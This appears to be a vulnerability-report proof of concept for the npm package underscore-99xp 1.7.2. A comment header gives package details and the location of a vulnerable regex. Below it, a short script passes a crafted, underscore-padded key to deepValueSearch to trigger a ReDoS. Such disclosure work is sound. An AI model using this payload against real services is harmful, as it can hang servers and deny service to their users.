/**
 * underscore-99xp 1.7.2 is vulnerable to ReDos
 * Package Manager: npm
 * Link to published package: https://github.com/brunnofoggia/underscore-99xp
 * Link to GitHub repo: https://github.com/brunnofoggia/underscore-99xp
 * Severity level: High
 * Module Description: Underscore-99xp is an extension based on experience of Underscore.
 * Additional Info: Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex (https://github.com/brunnofoggia/underscore-99xp/blob/a9b29cbb6093c543faff198236ea36f6a618bad1/lib/underscore-99xp.js#L181).
 * Contacted maintainer?: No
 * Open issue?: No
 * Steps to reproduce: you can execute the following command
 * node --experimental-modules underscore-99xp.mjs
 */

import _ from 'underscore-99xp';

var json = {_na_me_: '99_xp', _cont_acts_: [ {email: 'tea__m@99xp.org'} , {email: 'admin@99xp.org'} ]};
_.deepValueSearch('nonexistent[da____________________________________________________________________________________________________________ta][email]', json);